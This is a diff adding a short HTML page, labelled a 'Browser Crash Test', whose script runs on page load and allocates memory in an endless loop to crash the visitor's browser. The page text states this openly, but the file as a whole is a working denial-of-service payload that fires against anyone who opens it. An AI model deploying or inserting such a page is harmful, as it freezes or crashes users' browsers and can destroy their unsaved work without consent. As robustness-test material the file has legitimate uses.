@@ -1,0 +1,23 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memory Exhaustion Crash</title>
+    <script>
+        // Execute immediately when page loads
+        window.onload = function() {
+            let arr = [];
+            while (true) {
+                arr.push(new Array(1000000).fill('x'));
+            }
+        };
+    </script>
+</head>
+<body>
+    <h1>Browser Crash Test</h1>
+    <p>This page is attempting to crash your browser through memory exhaustion.</p>
+    <p>If your browser becomes unresponsive, you may need to force quit it.</p>
+</body>
+</html>
